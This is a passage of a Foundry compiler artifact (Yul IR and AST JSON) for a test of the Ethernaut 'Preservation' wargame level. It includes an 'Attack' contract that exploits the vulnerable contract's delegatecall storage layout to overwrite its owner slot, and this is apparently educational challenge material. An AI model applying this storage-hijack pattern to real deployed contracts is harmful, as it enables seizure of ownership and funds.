{...\"\n                    let _10 := 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D\n                    /// @src 0:2445:2804  \"if (hasHEVMContext()) {...\"\n                    if /** @src 0:3059:3075  \"hevmCodeSize > 0\" */ iszero(iszero(/** @src 0:2939:3043  \"assembly {...\" */ extcodesize(_10)))\n                    /// @src 0:2445:2804  \"if (hasHEVMContext()) {...\"\n                    {\n                        /// @src 0:2645:2712  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"), bytes32(uint256(0x01)))\"\n                        let expr_mpos := /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ mload(_4)\n                        mstore(/** @src 0:2645:2712  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"), bytes32(uint256(0x01)))\" */ add(expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _6), /** @src 0:2939:3043  \"assembly {...\" */ _10)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ add(/** @src 0:2645:2712  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"), bytes32(uint256(0x01)))\" */ expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4), /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ shl(210, 0x19985a5b1959))\n                        mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ add(/** @src 0:2645:2712  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"), bytes32(uint256(0x01)))\" */ expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 96), /** @src 0:2705:2709  \"0x01\" */ 0x01)\n                        /// @src 0:2645:2712  \"abi.encode(HEVM_ADDRESS, bytes32(\\\"failed\\\"), bytes32(uint256(0x01)))\"\n                        mstore(expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 96)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        let newFreePtr := add(expr_mpos, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ 128)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, expr_mpos))\n                        {\n                            mstore(0, shl(224, 0x4e487b71))\n                            mstore(4, 0x41)\n                            revert(0, 0x24)\n                        }\n                        mstore(/** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _4, /** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ newFreePtr)\n                        /// @src 0:2534:2730  \"abi.encodePacked(...\"\n                        let _11 := add(/** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ expr_mpos, /** @src 0:2534:2730  \"abi.encodePacked(...\" */ 160)\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        mstore(_11, shl(224, 0x70ca10bb))\n                        let length := mload(expr_mpos)\n                        let i := /** @src -1:-1:-1 */ 0\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        for { }\n                        lt(i, length)\n                        {\n                            i := add(i, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _6)\n                        }\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        {\n                            let _12 := add(expr_mpos, i)\n                            mstore(add(_12, 164), mload(add(_12, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ _6)))\n                        }\n                        /// @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\"\n                        if gt(i, length)\n                        {\n                            mstore(add(add(expr_mpos, length), 164), /** @src -1:-1:-1 */ 0)\n                        }\n                        /// @src 0:2534:2730  \"abi.encodePacked(...\"\n                        let _13 := sub(/** @src 0:1671:1735  \"address(bytes20(uint160(uint256(keccak256('hevm cheat code')))))\" */ add(expr_mpos, length), expr_mpos)\n                        /// @src 0:2534:2730  \"abi.encodePacked(...\"\n                        mstore(newFreePtr, add(_13, 4))\n                        finalize_allocation(newFreePtr, add(_13, 36))\n                        /// @src 0:2499:2744  \"HEVM_ADDRESS.call(...\"\n                        pop(call(gas(), /** @src 0:2939:3043  \"assembly {...\" */ _10, /** @src -1:-1:-1 */ 0, /** @src 0:2499:2744  \"HEVM_ADDRESS.call(...\" */ _11, mload(newFreePtr), /** @src -1:-1:-1 */ 0, 0))\n                        /// @src 0:2499:2744  \"HEVM_ADDRESS.call(...\"\n                        pop(extract_returndata())\n                    }\n                    /// @src 18:593:1658  \"contract PreservationTest is Test {...\"\n                    sstore(/** @src -1:-1:-1 */ 0, /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ or(and(sload(/** @src -1:-1:-1 */ 0), /** @src 18:593:1658  \"contract PreservationTest is Test {...\" */ not(65280)), 256))\n                }\n            }\n        }\n        /// @use-src 11:\"src/ethernaut/level_16/Preservation.sol\"\n        object \"Preservation_23885\" {\n            code {\n                {\n                    /// @src 11:57:1030  \"contract Preservation {...\"\n                    let _1 := memoryguard(0x80)\n                    if callvalue() { revert(0, 0) }\n                    let programSize := datasize(\"Preservation_23885\")\n                    let argSize := sub(codesize(), programSize)\n                    let newFreePtr := add(_1, and(add(argSize, 31), not(31)))\n                    if or(gt(newFreePtr, sub(shl(64, 1), 1)), lt(newFreePtr, _1))\n                    {\n                        mstore(/** @src -1:-1:-1 */ 0, /** @src 11:57:1030  \"contract Preservation {...\" */ shl(224, 0x4e487b71))\n                        mstore(4, 0x41)\n                        revert(/** @src -1:-1:-1 */ 0, /** @src 11:57:1030  \"contract Preservation {...\" */ 0x24)\n                    }\n                    mstore(64, newFreePtr)\n                    codecopy(_1, programSize, argSize)\n                    if slt(sub(add(_1, argSize), _1), 64)\n                    {\n                        revert(/** @src -1:-1:-1 */ 0, 0)\n                    }\n                    /// @src 11:57:1030  \"contract Preservation {...\"\n                    let value0 := abi_decode_address_fromMemory(_1)\n                    let value1 := abi_decode_address_fromMemory(add(_1, 32))\n                    let _2 := sub(shl(160, 1), 1)\n                    let _3 := not(sub(shl(160, 1), 1))\n                    sstore(/** @src -1:-1:-1 */ 0, /** @src 11:57:1030  \"contract Preservation {...\" */ or(and(sload(/** @src -1:-1:-1 */ 0), /** @src 11:57:1030  \"contract Preservation {...\" */ _3), and(value0, _2)))\n                    sstore(/** @src 11:537:580  \"timeZone2Library = _timeZone2LibraryAddress\" */ 0x01, /** @src 11:57:1030  \"contract Preservation {...\" */ or(and(sload(/** @src 11:537:580  \"timeZone2Library = _timeZone2LibraryAddress\" */ 0x01), /** @src 11:57:1030  \"contract Preservation {...\" */ _3), and(value1, _2)))\n                    sstore(/** @src 11:590:608  \"owner = msg.sender\" */ 0x02, /** @src 11:57:1030  \"contract Preservation {...\" */ or(and(sload(/** @src 11:590:608  \"owner = msg.sender\" */ 0x02), /** @src 11:57:1030  \"contract Preservation {...\" */ _3), /** @src 11:598:608  \"msg.sender\" */ caller()))\n                    /// @src 11:57:1030  \"contract Preservation {...\"\n                    let _4 := mload(64)\n                    let _5 := datasize(\"Preservation_23885_deployed\")\n                    codecopy(_4, dataoffset(\"Preservation_23885_deployed\"), _5)\n                    return(_4, _5)\n                }\n                function abi_decode_address_fromMemory(offset) -> value\n                {\n                    value := mload(offset)\n                    if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n                }\n            }\n            /// @use-src 11:\"src/ethernaut/level_16/Preservation.sol\"\n            object \"Preservation_23885_deployed\" {\n                code {\n                    {\n                        /// @src 11:57:1030  \"contract Preservation {...\"\n                        let _1 := memoryguard(0x80)\n                        let _2 := 64\n                        mstore(_2, _1)\n                        if iszero(lt(calldatasize(), 4))\n                        {\n                            let _3 := 0\n                            switch shr(224, calldataload(_3))\n                            case 0x27d6974f {\n                                if callvalue() { revert(_3, _3) }\n                                if slt(add(calldatasize(), not(3)), _3) { revert(_3, _3) }\n                                mstore(_1, and(sload(/** @src 11:154:185  \"address public timeZone2Library\" */ 1), /** @src 11:57:1030  \"contract Preservation {...\" */ sub(shl(160, 1), 1)))\n                                return(_1, 32)\n                            }\n                            case 0x3dc79422 {\n                                if callvalue() { revert(_3, _3) }\n                                if slt(add(calldatasize(), not(3)), _3) { revert(_3, _3) }\n                                let value := and(sload(_3), sub(shl(160, 1), 1))\n                                let memPos := mload(_2)\n                                mstore(memPos, value)\n                                return(memPos, 32)\n                            }\n                            case 0x5bda8fa4 {\n                                if callvalue() { revert(_3, _3) }\n                                if slt(add(calldatasize(), not(3)), 32) { revert(_3, _3) }\n                                let value_1 := and(sload(1), sub(shl(160, 1), 1))\n                                /// @src 11:965:1011  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                let expr_mpos := /** @src 11:57:1030  \"contract Preservation {...\" */ mload(_2)\n                                /// @src 11:965:1011  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                let _4 := add(expr_mpos, /** @src 11:57:1030  \"contract Preservation {...\" */ 32)\n                                /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                                mstore(_4, /** @src 11:57:1030  \"contract Preservation {...\" */ shl(226, 0x0efac9b1))\n                                /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                                mstore(add(/** @src 11:965:1011  \"abi.encodePacked(setTimeSignature, _timeStamp)\" */ expr_mpos, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ 36), /** @src 11:57:1030  \"contract Preservation {...\" */ calldataload(4))\n                                /// @src 11:965:1011  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                mstore(expr_mpos, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ 36)\n                                /// @src 11:965:1011  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                finalize_allocation(expr_mpos)\n                                /// @src 11:922:1021  \"timeZone2Library.delegatecall(...\"\n                                pop(delegatecall(gas(), value_1, _4, mload(expr_mpos), /** @src 11:57:1030  \"contract Preservation {...\" */ _3, _3))\n                                /// @src 11:922:1021  \"timeZone2Library.delegatecall(...\"\n                                pop(extract_returndata())\n                                /// @src 11:57:1030  \"contract Preservation {...\"\n                                return(mload(_2), _3)\n                            }\n                            case 0x8da5cb5b {\n                                if callvalue() { revert(_3, _3) }\n                                if slt(add(calldatasize(), not(3)), _3) { revert(_3, _3) }\n                                let value_2 := and(sload(/** @src 11:191:211  \"address public owner\" */ 2), /** @src 11:57:1030  \"contract Preservation {...\" */ sub(shl(160, 1), 1))\n                                let memPos_1 := mload(_2)\n                                mstore(memPos_1, value_2)\n                                return(memPos_1, 32)\n                            }\n                            case 0xf1e02620 {\n                                if callvalue() { revert(_3, _3) }\n                                if slt(add(calldatasize(), not(3)), 32) { revert(_3, _3) }\n                                let value_3 := and(sload(_3), sub(shl(160, 1), 1))\n                                /// @src 11:758:804  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                let expr_mpos_1 := /** @src 11:57:1030  \"contract Preservation {...\" */ mload(_2)\n                                /// @src 11:758:804  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                let _5 := add(expr_mpos_1, /** @src 11:57:1030  \"contract Preservation {...\" */ 32)\n                                /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                                mstore(_5, /** @src 11:57:1030  \"contract Preservation {...\" */ shl(226, 0x0efac9b1))\n                                /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                                mstore(add(/** @src 11:758:804  \"abi.encodePacked(setTimeSignature, _timeStamp)\" */ expr_mpos_1, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ 36), /** @src 11:57:1030  \"contract Preservation {...\" */ calldataload(4))\n                                /// @src 11:758:804  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                mstore(expr_mpos_1, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ 36)\n                                /// @src 11:758:804  \"abi.encodePacked(setTimeSignature, _timeStamp)\"\n                                finalize_allocation(expr_mpos_1)\n                                /// @src 11:715:814  \"timeZone1Library.delegatecall(...\"\n                                pop(delegatecall(gas(), value_3, _5, mload(expr_mpos_1), /** @src 11:57:1030  \"contract Preservation {...\" */ _3, _3))\n                                /// @src 11:715:814  \"timeZone1Library.delegatecall(...\"\n                                pop(extract_returndata())\n                                /// @src 11:57:1030  \"contract Preservation {...\"\n                                return(mload(_2), _3)\n                            }\n                        }\n                        revert(0, 0)\n                    }\n                    /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                    function finalize_allocation(memPtr)\n                    {\n                        let newFreePtr := add(memPtr, 96)\n                        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr))\n                        {\n                            mstore(0, shl(224, 0x4e487b71))\n                            mstore(4, 0x41)\n                            revert(0, 0x24)\n                        }\n                        mstore(64, newFreePtr)\n                    }\n                    function extract_returndata() -> data\n                    {\n                        switch returndatasize()\n                        case 0 { data := 96 }\n                        default {\n                            let _1 := returndatasize()\n                            let _2 := 0xffffffffffffffff\n                            if gt(_1, _2)\n                            {\n                                mstore(/** @src -1:-1:-1 */ 0, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ shl(224, 0x4e487b71))\n                                mstore(4, 0x41)\n                                revert(/** @src -1:-1:-1 */ 0, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ 0x24)\n                            }\n                            let _3 := not(31)\n                            let memPtr := /** @src 11:57:1030  \"contract Preservation {...\" */ mload(64)\n                            /// @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\"\n                            let newFreePtr := add(memPtr, and(add(and(add(_1, 31), _3), 63), _3))\n                            if or(gt(newFreePtr, _2), lt(newFreePtr, memPtr))\n                            {\n                                mstore(0, shl(224, 0x4e487b71))\n                                mstore(4, 0x41)\n                                revert(0, 0x24)\n                            }\n                            mstore(/** @src 11:57:1030  \"contract Preservation {...\" */ 64, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ newFreePtr)\n                            mstore(memPtr, _1)\n                            data := memPtr\n                            returndatacopy(add(memPtr, 0x20), /** @src -1:-1:-1 */ 0, /** @src 11:328:365  \"bytes4(keccak256(\\\"setTime(uint256)\\\"))\" */ returndatasize())\n                        }\n                    }\n                }\n                data \".metadata\" hex\"a26469706673582212207ff10cfbd50e8955cc39963f6373d0ea06b5f92e4e57de8e6c319b07f0fc101964736f6c634300080f0033\"\n            }\n        }\n        /// @use-src 11:\"src/ethernaut/level_16/Preservation.sol\"\n        object \"LibraryContract_23898\" {\n            code {\n                {\n                    /// @src 11:1075:1233  \"contract LibraryContract {...\"\n                    let _1 := memoryguard(0x80)\n                    mstore(64, _1)\n                    if callvalue() { revert(0, 0) }\n                    let _2 := datasize(\"LibraryContract_23898_deployed\")\n                    codecopy(_1, dataoffset(\"LibraryContract_23898_deployed\"), _2)\n                    return(_1, _2)\n                }\n            }\n            /// @use-src 11:\"src/ethernaut/level_16/Preservation.sol\"\n            object \"LibraryContract_23898_deployed\" {\n                code {\n                    {\n                        /// @src 11:1075:1233  \"contract LibraryContract {...\"\n                        if iszero(lt(calldatasize(), 4))\n                        {\n                            let _1 := 0\n                            if eq(0x3beb26c4, shr(224, calldataload(_1)))\n                            {\n                                if callvalue() { revert(_1, _1) }\n                                if slt(add(calldatasize(), not(3)), 32) { revert(_1, _1) }\n                                sstore(_1, calldataload(4))\n                                return(memoryguard(0x80), _1)\n                            }\n                        }\n                        revert(0, 0)\n                    }\n                }\n                data \".metadata\" hex\"a2646970667358221220108375a4f0a179ae7b38524e5d62fe0a86d62513e7d0f87d88f447a4355a0b0d64736f6c634300080f0033\"\n            }\n        }\n        /// @use-src 18:\"test/ethernaut/Preservation.t.sol\"\n        object \"Attack_24220\" {\n            code {\n                {\n                    /// @src 18:250:591  \"contract Attack {...\"\n                    let _1 := memoryguard(0x80)\n                    mstore(64, _1)\n                    if callvalue() { revert(0, 0) }\n                    let _2 := datasize(\"Attack_24220_deployed\")\n                    codecopy(_1, dataoffset(\"Attack_24220_deployed\"), _2)\n                    return(_1, _2)\n                }\n            }\n            /// @use-src 18:\"test/ethernaut/Preservation.t.sol\"\n            object \"Attack_24220_deployed\" {\n                code {\n                    {\n                        /// @src 18:250:591  \"contract Attack {...\"\n                        let _1 := memoryguard(0x80)\n                        mstore(64, _1)\n                        if iszero(lt(calldatasize(), 4))\n                        {\n                            let _2 := 0\n                            switch shr(224, calldataload(_2))\n                            case 0x3beb26c4 {\n                                if callvalue() { revert(_2, _2) }\n                                if slt(add(calldatasize(), not(3)), 32) { revert(_2, _2) }\n                                sstore(/** @src 18:532:582  \"owner = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf\" */ 0x02, /** @src 18:250:591  \"contract Attack {...\" */ or(and(sload(/** @src 18:532:582  \"owner = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf\" */ 0x02), /** @src 18:250:591  \"contract Attack {...\" */ shl(160, 0xffffffffffffffffffffffff)), /** @src 18:540:582  \"0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf\" */ 0x7e5f4552091a69125d5dfcb7b8c2659029395bdf))\n                                /// @src 18:250:591  \"contract Attack {...\"\n                                return(_1, _2)\n                            }\n                            case 0x8da5cb5b {\n                                if callvalue() { revert(_2, _2) }\n                                if slt(add(calldatasize(), not(3)), _2) { revert(_2, _2) }\n                                mstore(_1, and(sload(/** @src 18:325:345  \"address public owner\" */ 2), /** @src 18:250:591  \"contract Attack {...\" */ sub(shl(160, 1), 1)))\n                                return(_1, 32)\n                            }\n                            case 0xd4ee1d90 {\n                                if callvalue() { revert(_2, _2) }\n                                if slt(add(calldatasize(), not(3)), _2) { revert(_2, _2) }\n                                let value := and(sload(/** @src 18:296:319  \"address public newOwner\" */ 1), /** @src 18:250:591  \"contract Attack {...\" */ sub(shl(160, 1), 1))\n                                let memPos := mload(64)\n                                mstore(memPos, value)\n                                return(memPos, 32)\n                            }\n                        }\n                        revert(0, 0)\n                    }\n                }\n                data \".metadata\" hex\"a2646970667358221220f85ac1cff1a9a52dca8fc7bdf6ac643d4d1e5297b9cc9926625af17b4599aaa864736f6c634300080f0033\"\n            }\n        }\n        data \".metadata\" hex\"a264697066735822122003602a3116e323d0400ccb5992552cde1eb46cd22b3ab6998bc5ed4767a8f7bd64736f6c634300080f0033\"\n    }\n}\n",
  "ast": {
    "absolutePath": "test/ethernaut/Preservation.t.sol",
    "id": 24328,
    "exportedSymbols": {
      "Attack": [
        24220
      ],
      "DSTest": [
        1786
      ],
      "LibraryContract": [
        23898
      ],
      "Preservation": [
        23885
      ],
      "PreservationTest": [
        24327
      ],
      "Script": [
        2049
      ],
      "StdStorage": [
        5077
      ],
      "Test": [
        4979
      ],
      "Vm": [
        7098
      ],
      "console": [
        15162
      ],
      "console2": [
        23226
      ],
      "stdError": [
        5049
      ],
      "stdJson": [
        2409
      ],
      "stdMath": [
        6318
      ],
      "stdStorage": [
        6179
      ]
    },
    "nodeType": "SourceUnit",
    "src": "39:1620:18",
    "nodes": [
      {
        "id": 24198,
        "nodeType": "PragmaDirective",
        "src": "39:24:18",
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".13"
        ]
      },
      {
        "id": 24199,
        "nodeType": "ImportDirective",
        "src": "65:28:18",
        "absolutePath": "lib/forge-std/src/Test.sol",
        "file": "forge-std/Test.sol",
        "nameLocation": "-1:-1:-1",
        "scope": 24328,
        "sourceUnit": 6319,
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "id": 24201,
        "nodeType": "ImportDirective",
        "src": "94:75:18",
        "absolutePath": "src/ethernaut/level_16/Preservation.sol",
        "file": "../../src/ethernaut/level_16/Preservation.sol",
        "nameLocation": "-1:-1:-1",
        "scope": 24328,
        "sourceUnit": 23899,
        "symbolAliases": [
          {
            "foreign": {
              "id": 24200,
              "name": "Preservation",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 23885,
              "src": "102:12:18",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "id": 24203,
        "nodeType": "ImportDirective",
        "src": "170:78:18",
        "absolutePath": "src/ethernaut/level_16/Preservation.sol",
        "file": "../../src/ethernaut/level_16/Preservation.sol",
        "nameLocation": "-1:-1:-1",
        "scope": 24328,
        "sourceUnit": 23899,
        "symbolAliases": [
          {
            "foreign": {
              "id": 24202,
              "name": "LibraryContract",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 23898,
              "src": "178:15:18",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "id": 24220,
        "nodeType": "ContractDefinition",
        "src": "250:341:18",
        "nodes": [
          {
            "id": 24205,
            "nodeType": "VariableDeclaration",
            "src": "272:18:18",
            "constant": false,
            "mutability": "mutable",
            "name": "storedTime",
            "nameLocation": "280:10:18",
            "scope": 24220,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 24204,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "272:7:18",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "internal"
          },
          {
            "id": 24207,
            "nodeType": "VariableDeclaration",
            "src": "296:23:18",
            "constant": false,
            "functionSelector": "d4ee1d90",
            "mutability": "mutable",
            "name": "newOwner",
            "nameLocation": "311:8:18",
            "scope": 24220,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 24206,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "296:7:18",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24209,
            "nodeType": "VariableDeclaration",
            "src": "325:20:18",
            "constant": false,
            "functionSelector": "8da5cb5b",
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "340:5:18",
            "scope": 24220,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 24208,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "325:7:18",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24219,
            "nodeType": "FunctionDefinition",
            "src": "483:106:18",
            "body": {
              "id": 24218,
              "nodeType": "Block",
              "src": "522:67:18",
              "statements": [
                {
                  "expression": {
                    "id": 24216,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 24214,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 24209,
                      "src": "532:5:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "hexValue": "307837453546343535323039314136393132356435446643623762384332363539303239333935426466",
                      "id": 24215,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "540:42:18",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "value": "0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf"
                    },
                    "src": "532:50:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 24217,
                  "nodeType": "ExpressionStatement",
                  "src": "532:50:18"
                }
              ]
            },
            "functionSelector": "3beb26c4",
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "setTime",
            "nameLocation": "492:7:18",
            "parameters": {
              "id": 24212,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 24211,
                  "mutability": "mutable",
                  "name": "_time",
                  "nameLocation": "508:5:18",
                  "nodeType": "VariableDeclaration",
                  "scope": 24219,
                  "src": "500:13:18",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 24210,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "500:7:18",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "499:15:18"
            },
            "returnParameters": {
              "id": 24213,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "522:0:18"
            },
            "scope": 24220,
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Attack",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "linearizedBaseContracts": [
          24220
        ],
        "name": "Attack",
        "nameLocation": "259:6:18",
        "scope": 24328,
        "usedErrors": []
      },
      {
        "id": 24327,
        "nodeType": "ContractDefinition",
        "src": "593:1065:18",
        "nodes": [
          {
            "id": 24226,
            "nodeType": "UsingForDirective",
            "src": "633:32:18",
            "global": false,
            "libraryName": {
              "id": 24223,
              "name": "stdStorage",
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 6179,
              "src": "639:10:18"
            },
            "typeName": {
              "id": 24225,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 24224,
                "name": "StdStorage",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 5077,
                "src": "654:10:18"
              },
              "referencedDeclaration": 5077,
              "src": "654:10:18",
              "typeDescriptions": {
                "typeIdentifier": "t_struct$_StdStorage_$5077_storage_ptr",
                "typeString": "struct StdStorage"
              }
            }
          },
          {
            "id": 24229,
            "nodeType": "VariableDeclaration",
            "src": "671:22:18",
            "constant": false,
            "functionSelector": "1509c42a",
            "mutability": "mutable",
            "name": "pr",
            "nameLocation": "691:2:18",
            "scope": 24327,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Preservation_$23885",
              "typeString": "contract Preservation"
            },
            "typeName": {
              "id": 24228,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 24227,
                "name": "Preservation",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 23885,
                "src": "671:12:18"
              },
              "referencedDeclaration": 23885,
              "src": "671:12:18",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Preservation_$23885",
                "typeString": "contract Preservation"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24232,
            "nodeType": "VariableDeclaration",
            "src": "699:32:18",
            "constant": false,
            "functionSelector": "1432159f",
            "mutability": "mutable",
            "name": "timezone1",
            "nameLocation": "722:9:18",
            "scope": 24327,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_LibraryContract_$23898",
              "typeString": "contract LibraryContract"
            },
            "typeName": {
              "id": 24231,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 24230,
                "name": "LibraryContract",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 23898,
                "src": "699:15:18"
              },
              "referencedDeclaration": 23898,
              "src": "699:15:18",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                "typeString": "contract LibraryContract"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24235,
            "nodeType": "VariableDeclaration",
            "src": "737:32:18",
            "constant": false,
            "functionSelector": "4d159fb9",
            "mutability": "mutable",
            "name": "timezone2",
            "nameLocation": "760:9:18",
            "scope": 24327,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_LibraryContract_$23898",
              "typeString": "contract LibraryContract"
            },
            "typeName": {
              "id": 24234,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 24233,
                "name": "LibraryContract",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 23898,
                "src": "737:15:18"
              },
              "referencedDeclaration": 23898,
              "src": "737:15:18",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_LibraryContract_$23898",
                "typeString": "contract LibraryContract"
              }
            },
            "visibility": "public"
          },
          {
            "id": 24238,
            "nodeType": "VariableDeclaration",
            "src": "775:20:18",
            "constant": false,
            "functionSelector": "9e5faafc",
            "mutability": "mutable",
            "name": "attack",
            "nameLocation": "789:6:18",
            "scope": 24327,
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Attack_$24220",
              "typeString": "contract Attack"
            },
            "typeName": {
              "id": 24237,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 24236,
                "name": "Attack",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 24220,
                "src": "775:6:18"
              },
              "referencedDeclaration": 24220,
              "src": "775:6:18",
              "typeDescriptions": {
